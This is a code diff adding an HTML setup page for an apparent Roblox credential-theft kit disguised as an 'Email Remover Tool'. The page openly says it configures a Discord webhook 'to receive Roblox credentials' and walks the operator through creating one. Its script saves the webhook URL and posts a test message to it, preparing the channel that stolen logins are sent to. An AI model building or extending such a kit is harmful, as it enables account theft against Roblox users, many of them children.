@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Remover Setup</title>
+    <link href="all.min.css" rel="stylesheet">
+    <link href="css2.css" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #0066ff;
+            --secondary: #00a2ff;
+            --dark: #1a1a1a;
+            --light: #f5f5f5;
+            --success: #28a745;
+            --warning: #ffc107;
+            --danger: #dc3545;
+            --card-bg: rgba(255, 255, 255, 0.9);
+            --card-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0066ff, #00a2ff);
+            min-height: 100vh;
+            padding: 20px;
+            color: var(--dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            box-shadow: var(--card-shadow);
+            padding: 25px;
+            backdrop-filter: blur(10px);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .title {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--primary);
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 1rem;
+            color: #666;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-label i {
+            margin-right: 8px;
+            color: var(--primary);
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.2);
+        }
+
+        .btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 20px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn i {
+            margin-right: 10px;
+        }
+
+        .btn:hover {
+            background: var(--secondary);
+            transform: translateY(-2px);
+        }
+
+        .btn:disabled {
+            background: #cccccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .info-box {
+            background: rgba(0, 102, 255, 0.1);
+            border: 1px solid rgba(0, 102, 255, 0.3);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        .info-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            color: var(--primary);
+        }
+
+        .info-title i {
+            margin-right: 8px;
+        }
+
+        .info-content {
+            line-height: 1.6;
+            font-size: 0.9rem;
+        }
+
+        .info-content ol {
+            padding-left: 25px;
+            margin-top: 10px;
+        }
+
+        .info-content li {
+            margin-bottom: 8px;
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(40, 167, 69, 0.1);
+            border: 1px solid rgba(40, 167, 69, 0.3);
+            border-radius: 8px;
+            color: var(--success);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <h1 class="title">Email Remover Setup</h1>
+                <p class="subtitle">Configure your Discord webhook to receive Roblox credentials</p>
+            </div>
+
+            <div class="input-group">
+                <label for="webhook-url" class="input-label">
+                    <i class="fas fa-link"></i> Discord Webhook URL
+                </label>
+                <input id="webhook-url" class="input-field" type="text" placeholder="https://discord.com/api/webhooks/..." />
+            </div>
+
+            <button id="save-btn" class="btn">
+                <i class="fas fa-save"></i> Save Configuration
+            </button>
+
+            <div class="info-box">
+                <div class="info-title">
+                    <i class="fas fa-info-circle"></i> How to Create a Discord Webhook
+                </div>
+                <div class="info-content">
+                    <ol>
+                        <li>Open Discord and go to the server where you want to receive notifications</li>
+                        <li>Right-click on a text channel and select "Edit Channel"</li>
+                        <li>Go to "Integrations" > "Webhooks" > "New Webhook"</li>
+                        <li>Give your webhook a name (e.g., "Roblox Credentials")</li>
+                        <li>Click "Copy Webhook URL" and paste it in the field above</li>
+                        <li>Click "Save Changes" in Discord</li>
+                    </ol>
+                </div>
+            </div>
+
+            <div id="success-message" class="success-message">
+                <i class="fas fa-check-circle"></i> Configuration saved successfully! You can now close this page and use the Email Remover Tool.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const webhookUrlInput = document.getElementById('webhook-url');
+            const saveBtn = document.getElementById('save-btn');
+            const successMessage = document.getElementById('success-message');
+
+            // Check if webhook URL is already saved
+            const savedWebhook = localStorage.getItem('discord_webhook_url');
+            if (savedWebhook) {
+                webhookUrlInput.value = savedWebhook;
+            }
+
+            saveBtn.addEventListener('click', function() {
+                const webhookUrl = webhookUrlInput.value.trim();
+                
+                if (!webhookUrl) {
+                    alert('Please enter a Discord webhook URL');
+                    return;
+                }
+
+                if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                    alert('Please enter a valid Discord webhook URL');
+                    return;
+                }
+
+                // Save webhook URL to localStorage
+                localStorage.setItem('discord_webhook_url', webhookUrl);
+
+                // Show success message
+                successMessage.style.display = 'block';
+                
+                // Redirect to index.html after 2 seconds
+                setTimeout(function() {
+                    window.location.href = 'index.html';
+                }, 2000);
+
+                // Test the webhook
+                const testData = {
+                    content: 'Email Remover Tool has been configured successfully!',
+                    embeds: [{
+                        title: 'Configuration Test',
+                        description: 'This is a test message to confirm your webhook is working correctly.',
+                        color: 0x00FFFF,
+                        fields: [
+                            {
+                                name: 'Setup Time',
+                                value: new Date().toLocaleString(),
+                                inline: true
+                            }
+                        ]
+                    }]
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(testData)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to send test message');
+                    }
+                    console.log('Test message sent successfully');
+                })
+                .catch(error => {
+                    console.error('Error sending test message:', error);
+                    alert('Failed to send test message. Please check your webhook URL and try again.');
+                    successMessage.style.display = 'none';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
